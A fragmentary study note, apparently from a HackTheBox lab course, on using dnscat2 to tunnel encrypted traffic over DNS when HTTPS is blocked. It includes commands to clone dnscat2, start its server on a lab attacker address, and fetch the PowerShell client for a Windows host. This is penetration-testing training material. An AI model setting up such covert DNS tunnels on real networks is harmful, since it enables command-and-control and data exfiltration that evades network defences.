...
Aim to send encrypted data through DNS when HTTPS is disabled.
...
### Install Dnscat2 :
```bash
Bailly@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
...
```bash
Bailly@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
...
After running we the server, we’ll have a `secret key`, which we’ll have to provide to our `dnscat2 client on the Windows host` so that it can authenticate and encrypt the data that is sent to our external dnscat2 server.
...
```bash
# Cloning dnscat2-powershell 
Bailly@htb[/htb]$ git clone <https://github.com/lukebaggett/dnscat2-powershell.git>
```
